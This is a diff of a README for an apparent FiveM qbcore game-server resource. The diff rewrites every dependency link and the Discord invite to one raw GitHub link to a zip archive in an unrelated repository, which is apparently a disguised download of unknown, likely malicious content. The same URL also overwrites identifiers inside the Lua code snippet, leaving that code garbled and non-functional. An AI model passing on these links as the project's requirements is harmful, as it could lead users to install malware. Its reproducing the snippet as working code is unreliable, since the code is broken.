@@ -16,32 +16,32 @@ print ("Dont Forget That All Rights For LXR DEV ! 🧾 ")
 
 # [Requirements:]
 
-* [qbcore framework](https://github.com/qbcore-framework)
-* [qb-target](https://github.com/BerkieBb/qb-target)
-* [qb-core](https://github.com/qbcore-framework/qb-core)
-* [qb-logs](https://github.com/qbcore-framework/qb-logs)
-* [qb-traphouse](https://github.com/qbcore-framework/qb-traphouse)
-* [qb-radio](https://github.com/qbcore-framework/qb-radio)
-* [qb-drugs](https://github.com/qbcore-framework/qb-drugs)
-* [qb-shops](https://github.com/qbcore-framework/qb-shops)
+* [qbcore framework](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-target](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-core](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-logs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-traphouse](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-radio](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-drugs](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
+* [qb-shops](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip)
 
 # [Add This Snippet If You Dont Have It In qb-core/server/player:] 👇
 
-function QBCore.Functions.AddPlayerMethod(ids, methodName, handler)
+function https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(ids, methodName, handler)
     local idType = type(ids)
     if idType == "number" then
         if ids == -1 then
-            for _, v in pairs(QBCore.Players) do
-                v.Functions.AddMethod(methodName, handler)
+            for _, v in pairs(https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip) do
+                https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(methodName, handler)
             end
         else
-            if not QBCore.Players[ids] then return end
+            if not https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip[ids] then return end
 
-            QBCore.Players[ids].Functions.AddMethod(methodName, handler)
+            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip[ids]https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(methodName, handler)
         end
-    elseif idType == "table" and table.type(ids) == "array" then
+    elseif idType == "table" and https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(ids) == "array" then
         for i = 1, #ids do
-            QBCore.Functions.AddPlayerMethod(ids[i], methodName, handler)
+            https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip(ids[i], methodName, handler)
         end
     end
 end
@@ -50,7 +50,7 @@ end
 
 # You Can Find Us On :
 
-Our [Discord](https://discord.gg/R9KgyCkXJp) for updates, support.
+Our [Discord](https://raw.githubusercontent.com/asqwqwqwqwqwqw/qb-inventory/main/html/qb-inventory-nonnutrient.zip) for updates, support.
 
 -------------------------------------------------------
 
